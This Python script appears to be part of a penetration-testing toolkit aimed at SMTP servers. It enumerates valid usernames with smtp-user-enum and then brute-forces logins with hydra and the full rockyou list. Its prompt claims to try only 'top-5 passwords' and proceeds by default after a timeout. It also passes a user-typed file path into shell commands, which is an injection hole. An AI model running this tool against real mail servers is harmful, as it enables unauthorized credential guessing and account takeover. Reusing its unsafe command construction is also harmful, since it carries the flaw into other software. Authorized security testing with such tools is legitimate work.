#!/usr/bin/env python3
import sys
sys.dont_write_bytecode = True
import subprocess
import sys
import os
import time
import select

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from recon_deps import ensure_commands, ensure_wordlists, get_output_base

ensure_commands(["smtp-user-enum", "hydra"])
WORDLISTS = ensure_wordlists(["seclists_usernames", "rockyou"])

def check_installation():
    try:
        subprocess.run(["which", "smtp-user-enum"], check=True, stdout=subprocess.PIPE)
        return True
    except subprocess.CalledProcessError:
        print("⚠️ smtp-user-enum not found. Installing...")
        try:
            subprocess.run(["apt-get", "update"], check=True)
            subprocess.run(["apt-get", "install", "-y", "smtp-user-enum"], check=True)
            print("✅ smtp-user-enum installed successfully")
            return True
        except Exception as e:
            print(f"❌ Failed to install smtp-user-enum: {e}")
            return False

def prompt_with_timeout(prompt, default=None, timeout=3):
    print(prompt)
    print(f"⏱️ Timeout in {timeout} seconds (default: {default})")
    
    rlist, _, _ = select.select([sys.stdin], [], [], timeout)
    if rlist:
        user_input = sys.stdin.readline().rstrip()
        return user_input if user_input else default
    else:
        print(f"⏱️ Timeout, using default: {default}")
        return default

def main():
    if len(sys.argv) != 3:
        print("Usage: ./smtp-user-enum.py <ip_address> <port>")
        sys.exit(1)
    
    ip = sys.argv[1]
    port = sys.argv[2]
    
    # Create output directory
    output_dir = f"{get_output_base()}/{ip}/smtp-user-enum"
    os.makedirs(output_dir, exist_ok=True)
    report_file = f"{output_dir}/report.txt"
    
    # Check installation
    if not check_installation():
        sys.exit(1)
    
    print("================[ SMTP ENUM MENU ]================")
    print("[1] VRFY Method (3s default)")
    print("[2] EXPN Method")
    print("[3] RCPT TO Method")
    print("========================================================")
    
    choice = prompt_with_timeout("[?] Select option:", "1")
    
    method = "VRFY"
    if choice == "2":
        method = "EXPN"
    elif choice == "3":
        method = "RCPT"
    
    wordlist_choice = prompt_with_timeout("[?] Use default user list? (Y/n):", "Y")
    if wordlist_choice.upper() == "Y":
        wordlist = WORDLISTS["seclists_usernames"]
    else:
        wordlist = input("[!] User list path: ")
    
    cmd = f"smtp-user-enum -M {method} -U {wordlist} -t {ip}"
    
    try:
        with open(report_file, 'w') as report:
            process = subprocess.Popen(
                cmd,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                universal_newlines=True
            )
            
            for line in process.stdout:
                print(line, end='')
                report.write(line)
            
            process.wait()
        
        print("================[ PASSWORD SPRAYING ]================")
        spray_choice = prompt_with_timeout("[?] Spray with top-5 passwords? (Y/n):", "Y")
        
        if spray_choice.upper() == "Y":
            print("[✓] Testing with common passwords...")
            spray_cmd = f"hydra -L {wordlist} -P {WORDLISTS['rockyou']} {ip} smtp"
            
            with open(report_file, 'a') as report:
                report.write("\n\n=== PASSWORD SPRAYING ===\n")
                
                spray_process = subprocess.Popen(
                    spray_cmd,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    universal_newlines=True
                )
                
                for line in spray_process.stdout:
                    print(line, end='')
                    report.write(line)
                
                spray_process.wait()
        
        print("====================================================")
        print(f"✅ Report saved to: {report_file}")
    except Exception as e:
        print(f"❌ Error: {e}")

if __name__ == "__main__":
    main()
